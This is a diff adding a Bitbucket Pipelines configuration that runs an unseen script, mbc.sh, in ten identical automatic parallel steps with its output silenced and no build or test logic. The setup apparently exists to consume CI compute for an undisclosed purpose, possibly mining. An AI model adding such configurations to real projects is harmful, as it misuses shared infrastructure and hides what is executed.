@@ -1,0 +1,63 @@
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: '1'
+          deployment: production
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+
+      - step:
+          name: '2'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+
+      - step:
+          name: '3'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+          
+      - step:
+          name: '4'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+          
+      - step:
+          name: '5'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+          
+      - step:
+          name: '6'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+          
+      - step:
+          name: '7'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+
+      - step:
+          name: '8'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+          
+      - step:
+          name: '9'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
+          
+      - step:
+          name: '10'
+          trigger: 'automatic'
+          script:
+          - chmod +x mbc.sh && sh mbc.sh > /dev/null
